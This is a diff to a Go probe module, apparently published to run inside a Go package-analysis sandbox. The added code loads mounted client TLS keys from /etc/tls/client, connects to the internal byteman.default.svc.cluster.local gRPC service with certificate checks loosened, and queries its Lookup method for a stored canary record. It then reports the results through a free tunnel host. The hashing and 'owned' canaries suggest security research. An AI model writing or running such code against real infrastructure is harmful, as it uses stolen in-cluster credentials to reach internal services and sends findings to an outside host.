@@ -53,7 +53,7 @@ var descriptorRedirectPolicyName string
 const (
 	protocolVersion              = 1
 	moduleName                   = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion                 = "v0.0.50-codex"
+	probeVersion                 = "v0.0.56-codex"
 	targetRegistry               = "https://proxy.golang.org"
 	targetModuleName             = "github.com/benr00t3d/go-byteman-crosswrite-canary"
 	targetVersion                = "v0.0.1"
@@ -62,8 +62,18 @@ const (
 	pinnedReadbackHost           = "auciz-64-62-226-208.run.pinggy-free.link"
 	originGoneSHA256             = "2060dcc16cdd2cb518700076b1ccf2fadbff619b32af84250c176e70590f1f0a"
 	originGoneBytes              = 36
-	downloadSource               = "robert-owned-v050-cross-package-offline-canary"
-	expectedUserAgent            = "go-cgo-pkgsite-probe-v050-codex"
+	downloadSource               = "robert-owned-v056-cross-package-lookup"
+	expectedUserAgent            = "go-cgo-pkgsite-probe-v056-codex"
+	expectedRecordSHA256         = "adfb1c1ce1b1b12a6c7fb47bc71a599080dec7357763e3af5d937849c7961e47"
+	expectedDigestFieldSHA256    = "6bc319fc0d36191274cec1b7269adfd81385b88169cdf83a783dc882097a6b94"
+	expectedIDFieldSHA256        = "98a540dcf85bd84794699b0522f3e5d8f5de0697b1b0c51eef1c39058ba58ce3"
+	expectedMetadataSHA256       = "d8a03518274139d9b6dbec8b09ce0e6d9ec1ddfc3c9d5a15119ca7c677d85a62"
+	expectedPathFieldSHA256      = "59af025ea13df7229bbdf0be891d14d7e5e329584c1f0ff5c52b6861abcf978f"
+	expectedSHA512Hex            = "a3b9e460a4e6c294b91d4677329ede02dd062ff70f431efb1b6853d98f3a146cb5cebafca064ec28e10e84a32b8e5c3892e8fce542528e40b654e5170e32cb68"
+	expectedSHA1Hex              = "b1cd071d32f0c5cd30699b5d27086059c3fba547"
+	expectedMD5Hex               = "570588f59942a9c79262238525fbe16f"
+	expectedLookupPayloadSHA256  = "7d61c9846d0a9ba07c633662c47b978fe0e202b9bc729a8abbd98be5bead9fcf"
+	expectedLookupFrameSHA256    = "ab2075e097f140da5dc08b7bff417dc2a5b16e563e29fe77334554a1674a162a"
 	sosSessionMetadataKey        = "X-SOS-SessionID"
 	descriptorReceiptSHA256      = "2f971b887a6da75675db2d570d14fe28f788a1513cefec2f3c521afb725ec225"
 	maximumResult                = 256 * 1024
@@ -156,49 +166,59 @@ type bucketResult struct {
 }
 
 type grpcResult struct {
-	ID                   string            `json:"id,omitempty"`
-	Method               string            `json:"method"`
-	HTTPStatus           int               `json:"http_status,omitempty"`
-	GRPCStatus           string            `json:"grpc_status,omitempty"`
-	GRPCMessage          string            `json:"grpc_message,omitempty"`
-	BodyBytes            int               `json:"body_bytes,omitempty"`
-	BodySHA256           string            `json:"body_sha256,omitempty"`
-	ContentType          string            `json:"content_type,omitempty"`
-	Authenticated        bool              `json:"authenticated"`
-	RequestPayloadBytes  int               `json:"request_payload_bytes,omitempty"`
-	RequestPayloadSHA256 string            `json:"request_payload_sha256,omitempty"`
-	RequestFrameBytes    int               `json:"request_frame_bytes,omitempty"`
-	RequestFrameSHA256   string            `json:"request_frame_sha256,omitempty"`
-	RequestWire          []wireFieldDigest `json:"request_wire,omitempty"`
-	RequestWireError     string            `json:"request_wire_error,omitempty"`
-	Wire                 []wireFieldDigest `json:"wire,omitempty"`
-	LookupRecordMatched  bool              `json:"lookup_record_matched,omitempty"`
-	LookupMatchPath      string            `json:"lookup_match_path,omitempty"`
-	LookupRecordCount    int               `json:"lookup_record_count,omitempty"`
-	LookupMatchCount     int               `json:"lookup_match_count,omitempty"`
-	LookupRecordsSHA256  string            `json:"lookup_records_sha256,omitempty"`
-	LookupMatchSHA256    string            `json:"lookup_match_sha256,omitempty"`
-	RecordMatched        bool              `json:"record_matched,omitempty"`
-	RecordSHA256         string            `json:"record_sha256,omitempty"`
-	DigestFieldSHA256    string            `json:"digest_field_sha256,omitempty"`
-	IDFieldSHA256        string            `json:"id_field_sha256,omitempty"`
-	DownloadStatusCode   uint64            `json:"download_status_code,omitempty"`
-	DownloadStatusSet    bool              `json:"download_status_set,omitempty"`
-	PayloadBytes         int               `json:"payload_bytes,omitempty"`
-	PayloadSHA256        string            `json:"payload_sha256,omitempty"`
-	PayloadPath          string            `json:"payload_path,omitempty"`
-	FrameCount           int               `json:"frame_count,omitempty"`
-	FrameSHA256          []string          `json:"frame_sha256,omitempty"`
-	HeaderCount          int               `json:"header_count,omitempty"`
-	HeaderSHA256         string            `json:"header_sha256,omitempty"`
-	HeaderValid          bool              `json:"header_valid"`
-	HeaderStatusSet      bool              `json:"header_status_set"`
-	HeaderStatusCode     uint64            `json:"header_status_code,omitempty"`
-	HeaderContentType    string            `json:"header_content_type,omitempty"`
-	RawHeaderCount       int               `json:"raw_header_count,omitempty"`
-	EarlyClose           bool              `json:"early_close_after_exact_payload"`
-	AnalysisError        string            `json:"analysis_error,omitempty"`
-	Error                string            `json:"error,omitempty"`
+	ID                      string            `json:"id,omitempty"`
+	Method                  string            `json:"method"`
+	HTTPStatus              int               `json:"http_status,omitempty"`
+	GRPCStatus              string            `json:"grpc_status,omitempty"`
+	GRPCMessage             string            `json:"grpc_message,omitempty"`
+	GRPCStatusHeader        string            `json:"grpc_status_header,omitempty"`
+	GRPCMessageHeader       string            `json:"grpc_message_header,omitempty"`
+	GRPCStatusTrailer       string            `json:"grpc_status_trailer,omitempty"`
+	GRPCMessageTrailer      string            `json:"grpc_message_trailer,omitempty"`
+	BodyBytes               int               `json:"body_bytes,omitempty"`
+	BodySHA256              string            `json:"body_sha256,omitempty"`
+	ContentType             string            `json:"content_type,omitempty"`
+	Authenticated           bool              `json:"authenticated"`
+	RequestPayloadBytes     int               `json:"request_payload_bytes,omitempty"`
+	RequestPayloadSHA256    string            `json:"request_payload_sha256,omitempty"`
+	RequestFrameBytes       int               `json:"request_frame_bytes,omitempty"`
+	RequestFrameSHA256      string            `json:"request_frame_sha256,omitempty"`
+	RequestWire             []wireFieldDigest `json:"request_wire,omitempty"`
+	RequestWireError        string            `json:"request_wire_error,omitempty"`
+	SOSSessionHeaderPresent bool              `json:"sos_session_header_present"`
+	SOSSessionHeaderBytes   int               `json:"sos_session_header_bytes"`
+	SOSSessionHeaderSHA256  string            `json:"sos_session_header_sha256,omitempty"`
+	Wire                    []wireFieldDigest `json:"wire,omitempty"`
+	LookupRecordMatched     bool              `json:"lookup_record_matched,omitempty"`
+	LookupMatchPath         string            `json:"lookup_match_path,omitempty"`
+	LookupRecordCount       int               `json:"lookup_record_count,omitempty"`
+	LookupMatchCount        int               `json:"lookup_match_count,omitempty"`
+	LookupRecordsSHA256     string            `json:"lookup_records_sha256,omitempty"`
+	LookupMatchSHA256       string            `json:"lookup_match_sha256,omitempty"`
+	RecordMatched           bool              `json:"record_matched,omitempty"`
+	RecordSHA256            string            `json:"record_sha256,omitempty"`
+	DigestFieldSHA256       string            `json:"digest_field_sha256,omitempty"`
+	IDFieldSHA256           string            `json:"id_field_sha256,omitempty"`
+	PathFieldSHA256         string            `json:"path_field_sha256,omitempty"`
+	RawDigestsMatched       bool              `json:"raw_digests_matched"`
+	DownloadStatusCode      uint64            `json:"download_status_code,omitempty"`
+	DownloadStatusSet       bool              `json:"download_status_set,omitempty"`
+	PayloadBytes            int               `json:"payload_bytes,omitempty"`
+	PayloadSHA256           string            `json:"payload_sha256,omitempty"`
+	PayloadPath             string            `json:"payload_path,omitempty"`
+	FrameCount              int               `json:"frame_count,omitempty"`
+	FrameSHA256             []string          `json:"frame_sha256,omitempty"`
+	HeaderCount             int               `json:"header_count,omitempty"`
+	HeaderSHA256            string            `json:"header_sha256,omitempty"`
+	HeaderValid             bool              `json:"header_valid"`
+	HeaderStatusSet         bool              `json:"header_status_set"`
+	HeaderStatusCode        uint64            `json:"header_status_code,omitempty"`
+	HeaderContentType       string            `json:"header_content_type,omitempty"`
+	RawHeaderCount          int               `json:"raw_header_count,omitempty"`
+	EarlyClose              bool              `json:"early_close_after_exact_payload"`
+	EarlyCloseExactRecord   bool              `json:"early_close_after_exact_record"`
+	AnalysisError           string            `json:"analysis_error,omitempty"`
+	Error                   string            `json:"error,omitempty"`
 }
 
 type wireFieldDigest struct {
@@ -258,6 +278,7 @@ type probeReport struct {
 	FreshMTLSClient         bool              `json:"fresh_mtls_client"`
 	Origin                  originResult      `json:"origin"`
 	StreamVerified          bool              `json:"stream_verified"`
+	LookupVerified          bool              `json:"lookup_verified"`
 	PlanID                  string            `json:"plan_id,omitempty"`
 	RouteMode               string            `json:"route_mode,omitempty"`
 	Inspection              *inspectionResult `json:"inspection,omitempty"`
@@ -320,7 +341,6 @@ func validateRuntimeConfiguration() error {
 	}{
 		{genericResultURL, "/v1/result/" + sessionNonce + "/generic"},
 		{compilerResultURL, "/v1/result/" + sessionNonce + "/compiler"},
-		{planURL, "/v1/plan/" + sessionNonce},
 	}
 	var origin string
 	for _, item := range paths {
@@ -368,14 +388,18 @@ func main() {
 	started := time.Now()
 	cwd := initialWorkingDirectory()
 	identity := inspectIdentity(cwd)
-	if identity.Lane == "capslock" {
-		runCapslockSession(started, cwd, identity)
-		return
-	}
 	report := newProbeReport(started, identity)
-	report.Reason = "internal checks are fixed to the verified capslock lane"
+	endpoint := genericResultURL
+	resultID := "v056-codex-" + identity.Lane
+	if identity.Lane == "capslock" {
+		endpoint = compilerResultURL
+		resultID = "v056-codex-capslock-lookup"
+		runExistingLookup(&report)
+	} else {
+		report.Reason = "persisted-record Lookup is fixed to the verified capslock lane"
+	}
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v050-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(endpoint, resultID, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -659,6 +683,92 @@ func fillCapslockContext(report *probeReport) {
 	report.Reason = "read-only Stream client; no cloud permission checks"
 }
 
+func runExistingLookup(report *probeReport) {
+	canaryURLDigest := sha256.Sum256([]byte(bytemanCanaryURL))
+	report.CanaryURLSHA256 = hex.EncodeToString(canaryURLDigest[:])
+	report.CanaryBodySHA256 = targetCanarySHA256
+	if err := validateRuntimeConfiguration(); err != nil {
+		report.Reason = "source-pinned owned-B Lookup validation failed"
+		return
+	}
+	client, endpoint, err := newLookupMTLSClient()
+	if err != nil {
+		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
+		report.Reason = "fixed direct mTLS client setup failed"
+		return
+	}
+	defer client.CloseIdleConnections()
+	result := callLookupIncremental(client, endpoint)
+	report.Byteman = append(report.Byteman, result)
+	report.FreshMTLSClient = true
+	report.LookupVerified = result.AnalysisError == "" && result.Error == "" &&
+		result.EarlyCloseExactRecord && result.LookupRecordMatched && result.LookupMatchCount == 1 &&
+		result.RecordSHA256 == expectedRecordSHA256 && result.DigestFieldSHA256 == expectedDigestFieldSHA256 &&
+		result.IDFieldSHA256 == expectedIDFieldSHA256 && result.RawDigestsMatched
+	if report.LookupVerified {
+		report.Reason = "exact persisted v44 owned-B Download record returned by Byteman Lookup"
+	} else {
+		report.Reason = "bounded persisted-record Lookup did not return the exact v44 record"
+	}
+}
+
+func newLookupMTLSClient() (*http.Client, string, error) {
+	const serviceHost = "byteman.default.svc.cluster.local"
+	const port = 9000
+	certificate, err := tls.LoadX509KeyPair("/etc/tls/client/tls.crt", "/etc/tls/client/tls.key")
+	if err != nil {
+		return nil, "", err
+	}
+	rootPEM, err := os.ReadFile("/etc/tls/server-pool/server-tls-pool.pem")
+	if err != nil {
+		return nil, "", err
+	}
+	roots, err := mountedPrivateRootPool(rootPEM)
+	if err != nil {
+		return nil, "", err
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+	addresses, err := net.DefaultResolver.LookupIPAddr(ctx, serviceHost)
+	if err != nil {
+		return nil, "", errors.New("fixed direct Byteman service did not resolve")
+	}
+	var selected net.IP
+	for _, candidate := range addresses {
+		if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
+			selected = candidate.IP
+			break
+		}
+	}
+	if selected == nil {
+		return nil, "", errors.New("fixed direct Byteman service had no private address")
+	}
+	address := net.JoinHostPort(selected.String(), strconv.Itoa(port))
+	rpcServiceHost = serviceHost
+	rpcDialAddress = address
+	dialer := &net.Dialer{Timeout: requestTimeout, KeepAlive: 30 * time.Second}
+	tlsConfig := &tls.Config{
+		Certificates:       []tls.Certificate{certificate},
+		RootCAs:            roots,
+		MinVersion:         tls.VersionTLS12,
+		ServerName:         "localhost",
+		InsecureSkipVerify: true, // Full chain and exact legacy CN are verified below.
+		VerifyConnection: func(state tls.ConnectionState) error {
+			return verifyLegacyLocalhost(state, roots)
+		},
+	}
+	transport := &http.Transport{
+		Proxy: nil,
+		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
+			return dialer.DialContext(ctx, network, address)
+		},
+		TLSClientConfig:   tlsConfig,
+		ForceAttemptHTTP2: true,
+	}
+	endpoint := "https://" + net.JoinHostPort(serviceHost, strconv.Itoa(port))
+	return &http.Client{Transport: transport, Timeout: bytemanHTTPTimeout}, endpoint, nil
+}
+
 func runExistingReadback(report *probeReport, routeMode string) {
 	canaryURLDigest := sha256.Sum256([]byte(bytemanCanaryURL))
 	report.CanaryURLSHA256 = hex.EncodeToString(canaryURLDigest[:])
@@ -880,6 +990,225 @@ func callLookup(client *http.Client, endpoint, id string, request []byte) grpcRe
 func callLookupTimeout(client *http.Client, endpoint, id string, request []byte, timeout time.Duration) grpcResult {
 	result, body := callGRPCRawTimeout(client, endpoint, "/sos.byteman.Byteman/Lookup", request, timeout)
 	return finishLookup(result, body, id)
+}
+
+func cleanGRPCMetadataMessage(value string) string {
+	if decoded, err := url.QueryUnescape(value); err == nil {
+		value = decoded
+	}
+	value = strings.ReplaceAll(value, sessionNonce, "[session]")
+	value = strings.ReplaceAll(value, bytemanCanaryURL, "[canary-url]")
+	if len(value) > 1024 {
+		value = value[:1024] + "[truncated]"
+	}
+	return value
+}
+
+func callLookupIncremental(client *http.Client, endpoint string) grpcResult {
+	const method = "/sos.byteman.Byteman/Lookup"
+	result := grpcResult{ID: "persisted-v44-url-lookup", Method: method}
+	payload := buildURLLookupRequest(bytemanCanaryURL)
+	frame := attachRequestTranscript(&result, payload)
+	decoded, valid := decodeWireMessage(payload, 0)
+	if len(payload) != 191 || !valid || len(decoded.fields) != 1 || decoded.fields[0].number != 2 ||
+		decoded.fields[0].wire != 2 || string(decoded.fields[0].value) != bytemanCanaryURL ||
+		result.RequestPayloadSHA256 != expectedLookupPayloadSHA256 || result.RequestFrameSHA256 != expectedLookupFrameSHA256 {
+		result.Error = "LookupRequest was not the exact 191-byte URL-field-2 request"
+		return result
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), bytemanHTTPTimeout)
+	defer cancel()
+	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+method, bytes.NewReader(frame))
+	if err != nil {
+		result.Error = cleanError(err)
+		return result
+	}
+	request.Header.Set("Content-Type", "application/grpc")
+	request.Header.Set("TE", "trailers")
+	request.Header.Set("User-Agent", probeUserAgent)
+	request.Header.Set(sosSessionMetadataKey, "")
+	values, present := request.Header[http.CanonicalHeaderKey(sosSessionMetadataKey)]
+	result.SOSSessionHeaderPresent = present && len(values) == 1
+	if result.SOSSessionHeaderPresent {
+		result.SOSSessionHeaderBytes = len(values[0])
+		digest := sha256.Sum256([]byte(values[0]))
+		result.SOSSessionHeaderSHA256 = hex.EncodeToString(digest[:])
+	}
+	request.Header.Set("Grpc-Timeout", "60S")
+	response, err := client.Do(request)
+	if err != nil {
+		result.Error = cleanError(err)
+		return result
+	}
+	defer response.Body.Close()
+	result.HTTPStatus = response.StatusCode
+	result.ContentType = response.Header.Get("Content-Type")
+	result.GRPCStatusHeader = response.Header.Get("Grpc-Status")
+	result.GRPCMessageHeader = cleanGRPCMetadataMessage(response.Header.Get("Grpc-Message"))
+	contentType := strings.ToLower(strings.TrimSpace(strings.Split(result.ContentType, ";")[0]))
+	if response.StatusCode != http.StatusOK ||
+		(contentType != "application/grpc" && contentType != "application/grpc+proto") {
+		result.Error = "Lookup endpoint did not return HTTP 200 application/grpc"
+		return result
+	}
+	result.Authenticated = true
+	analysis, readErr := readExactLookupFrames(response.Body)
+	result.GRPCStatusTrailer = response.Trailer.Get("Grpc-Status")
+	result.GRPCMessageTrailer = cleanGRPCMetadataMessage(response.Trailer.Get("Grpc-Message"))
+	if result.GRPCStatusTrailer != "" {
+		result.GRPCStatus = result.GRPCStatusTrailer
+		result.GRPCMessage = result.GRPCMessageTrailer
+	} else {
+		result.GRPCStatus = result.GRPCStatusHeader
+		result.GRPCMessage = result.GRPCMessageHeader
+	}
+	result.BodyBytes = analysis.BodyBytes
+	result.BodySHA256 = analysis.BodySHA256
+	result.FrameCount = analysis.FrameCount
+	result.FrameSHA256 = analysis.FrameSHA256
+	result.Wire = analysis.Wire
+	result.LookupRecordCount = analysis.RecordCount
+	result.LookupMatchCount = analysis.MatchCount
+	result.LookupRecordsSHA256 = analysis.RecordsSHA256
+	result.LookupMatchSHA256 = analysis.MatchSHA256
+	result.LookupMatchPath = analysis.MatchPath
+	result.RecordMatched = analysis.MatchCount == 1
+	result.LookupRecordMatched = analysis.MatchCount == 1
+	result.RecordSHA256 = analysis.Identity.RecordSHA256
+	result.DigestFieldSHA256 = analysis.Identity.DigestSHA256
+	result.IDFieldSHA256 = analysis.Identity.IDSHA256
+	result.PathFieldSHA256 = analysis.Identity.PathSHA256
+	result.RawDigestsMatched = analysis.Identity.RawDigestsMatched
+	if readErr != nil {
+		result.AnalysisError = cleanError(readErr)
+		return result
+	}
+	result.EarlyCloseExactRecord = true
+	return result
+}
+
+type incrementalLookupAnalysis struct {
+	BodyBytes     int
+	BodySHA256    string
+	FrameCount    int
+	FrameSHA256   []string
+	Wire          []wireFieldDigest
+	RecordCount   int
+	MatchCount    int
+	RecordsSHA256 string
+	MatchSHA256   string
+	MatchPath     string
+	Identity      downloadRecordIdentity
+}
+
+func readExactLookupFrames(reader io.Reader) (incrementalLookupAnalysis, error) {
+	return readLookupFramesWithMatcher(reader, matchPersistedDownload)
+}
+
+type lookupRecordMatcher func([]byte) (downloadRecordIdentity, bool, error)
+
+func matchPersistedDownload(value []byte) (downloadRecordIdentity, bool, error) {
+	recordDigest := sha256.Sum256(value)
+	if hex.EncodeToString(recordDigest[:]) != expectedRecordSHA256 {
+		return downloadRecordIdentity{}, false, nil
+	}
+	identity, err := analyzePersistedDownload(value)
+	return identity, true, err
+}
+
+func readLookupFramesWithMatcher(reader io.Reader, matcher lookupRecordMatcher) (incrementalLookupAnalysis, error) {
+	analysis := incrementalLookupAnalysis{}
+	if matcher == nil {
+		return analysis, errors.New("Lookup record matcher was unavailable")
+	}
+	bodyHasher := sha256.New()
+	recordsHasher := sha256.New()
+	matchesHasher := sha256.New()
+	finish := func() {
+		analysis.BodySHA256 = hex.EncodeToString(bodyHasher.Sum(nil))
+		if analysis.RecordCount > 0 {
+			analysis.RecordsSHA256 = hex.EncodeToString(recordsHasher.Sum(nil))
+		}
+		if analysis.MatchCount > 0 {
+			analysis.MatchSHA256 = hex.EncodeToString(matchesHasher.Sum(nil))
+		}
+	}
+	for analysis.FrameCount < maximumStreamFrames {
+		header := make([]byte, 5)
+		if _, err := io.ReadFull(reader, header); err != nil {
+			finish()
+			return analysis, fmt.Errorf("Lookup ended before the exact record: %w", err)
+		}
+		analysis.BodyBytes += len(header)
+		_, _ = bodyHasher.Write(header)
+		if header[0] != 0 {
+			finish()
+			return analysis, errors.New("compressed Lookup gRPC frame was not allowed")
+		}
+		length := int(binary.BigEndian.Uint32(header[1:]))
+		if length < 0 || length > maximumStreamFrameBytes || analysis.BodyBytes+length > maximumBody {
+			finish()
+			return analysis, errors.New("Lookup gRPC frame exceeded the bounded response size")
+		}
+		messageBytes := make([]byte, length)
+		if _, err := io.ReadFull(reader, messageBytes); err != nil {
+			finish()
+			return analysis, fmt.Errorf("truncated Lookup gRPC frame: %w", err)
+		}
+		analysis.BodyBytes += len(messageBytes)
+		_, _ = bodyHasher.Write(messageBytes)
+		fullFrame := append(append([]byte(nil), header...), messageBytes...)
+		frameDigest := sha256.Sum256(fullFrame)
+		analysis.FrameSHA256 = append(analysis.FrameSHA256, hex.EncodeToString(frameDigest[:]))
+		frameIndex := analysis.FrameCount
+		analysis.FrameCount++
+
+		message, valid := decodeWireMessage(messageBytes, 0)
+		if !valid {
+			finish()
+			return analysis, errors.New("Lookup frame was not valid bounded protobuf wire data")
+		}
+		if err := walkWireMessage(message, "frame["+strconv.Itoa(frameIndex)+"]", &analysis.Wire); err != nil {
+			finish()
+			return analysis, err
+		}
+		fieldIndex := 0
+		for _, field := range message.fields {
+			if field.number != 1 || field.wire != 2 {
+				finish()
+				return analysis, errors.New("LookupResponse contained a field outside repeated Download field 1")
+			}
+			analysis.RecordCount++
+			if analysis.RecordCount > lookupRecordLimit {
+				finish()
+				return analysis, errors.New("LookupResponse exceeded the bounded record count")
+			}
+			writeFingerprintRecord(recordsHasher, field.value)
+			identity, matched, err := matcher(field.value)
+			if err != nil {
+				finish()
+				return analysis, err
+			}
+			if matched {
+				analysis.MatchCount++
+				if analysis.MatchCount > 1 {
+					finish()
+					return analysis, errors.New("LookupResponse duplicated the exact persisted record")
+				}
+				writeFingerprintRecord(matchesHasher, field.value)
+				analysis.MatchPath = "frame[" + strconv.Itoa(frameIndex) + "].1[" + strconv.Itoa(fieldIndex) + "]"
+				analysis.Identity = identity
+			}
+			fieldIndex++
+		}
+		if analysis.MatchCount == 1 {
+			finish()
+			return analysis, nil
+		}
+	}
+	finish()
+	return analysis, errors.New("Lookup response exceeded the bounded frame count")
 }
 
 func finishLookup(result grpcResult, body []byte, id string) grpcResult {
@@ -1547,10 +1876,93 @@ type lookupBodyAnalysis struct {
 }
 
 type downloadRecordIdentity struct {
-	Matched      bool
-	RecordSHA256 string
-	DigestSHA256 string
-	IDSHA256     string
+	Matched           bool
+	RecordSHA256      string
+	DigestSHA256      string
+	IDSHA256          string
+	PathSHA256        string
+	RawDigestsMatched bool
+}
+
+func exactDigestMessage(value []byte) bool {
+	message, valid := decodeWireMessage(value, 0)
+	if !valid || len(message.fields) != 4 {
+		return false
+	}
+	expected := map[int]string{
+		1: expectedSHA512Hex,
+		2: targetCanarySHA256,
+		3: expectedSHA1Hex,
+		4: expectedMD5Hex,
+	}
+	seen := map[int]bool{}
+	for _, field := range message.fields {
+		want, known := expected[field.number]
+		if !known || seen[field.number] || field.wire != 2 || hex.EncodeToString(field.value) != want {
+			return false
+		}
+		seen[field.number] = true
+	}
+	return len(seen) == 4
+}
+
+func analyzePersistedDownload(value []byte) (downloadRecordIdentity, error) {
+	identity := downloadRecordIdentity{}
+	recordDigest := sha256.Sum256(value)
+	identity.RecordSHA256 = hex.EncodeToString(recordDigest[:])
+	if len(value) != 955 || identity.RecordSHA256 != expectedRecordSHA256 {
+		return identity, errors.New("Lookup Download did not match the exact v44 record bytes")
+	}
+	message, valid := decodeWireMessage(value, 0)
+	if !valid {
+		return identity, errors.New("exact v44 Download record was not valid bounded protobuf wire data")
+	}
+	counts := map[int]int{}
+	matched := map[int]bool{}
+	for _, field := range message.fields {
+		switch field.number {
+		case 1:
+			counts[1]++
+			matched[1] = field.wire == 2 && string(field.value) == bytemanCanaryURL
+		case 2:
+			counts[2]++
+			digest := sha256.Sum256(field.value)
+			identity.DigestSHA256 = hex.EncodeToString(digest[:])
+			identity.RawDigestsMatched = exactDigestMessage(field.value)
+			matched[2] = field.wire == 2 && len(field.value) == 140 &&
+				identity.DigestSHA256 == expectedDigestFieldSHA256 && identity.RawDigestsMatched
+		case 3:
+			counts[3]++
+			matched[3] = field.wire == 0 && field.varint == targetCanaryBytes
+		case 5:
+			counts[5]++
+			matched[5] = field.wire == 0 && field.varint == http.StatusOK
+		case 12:
+			counts[12]++
+			metadataDigest := sha256.Sum256(field.value)
+			metadata, valid := decodeWireMessage(field.value, 0)
+			matched[12] = field.wire == 2 && len(field.value) == 89 &&
+				hex.EncodeToString(metadataDigest[:]) == expectedMetadataSHA256 && valid && targetMetadataMatches(metadata)
+		case 16:
+			counts[16]++
+			pathDigest := sha256.Sum256(field.value)
+			identity.PathSHA256 = hex.EncodeToString(pathDigest[:])
+			matched[16] = field.wire == 2 && len(field.value) == 176 &&
+				identity.PathSHA256 == expectedPathFieldSHA256 && utf8.Valid(field.value)
+		case 17:
+			counts[17]++
+			idDigest := sha256.Sum256(field.value)
+			identity.IDSHA256 = hex.EncodeToString(idDigest[:])
+			matched[17] = field.wire == 2 && len(field.value) == 36 && identity.IDSHA256 == expectedIDFieldSHA256
+		}
+	}
+	for _, number := range []int{1, 2, 3, 5, 12, 16, 17} {
+		if counts[number] != 1 || !matched[number] {
+			return identity, errors.New("exact v44 Download record failed a required URL/digest/size/status/metadata/path/ID field check")
+		}
+	}
+	identity.Matched = true
+	return identity, nil
 }
 
 type downloadBodyAnalysis struct {
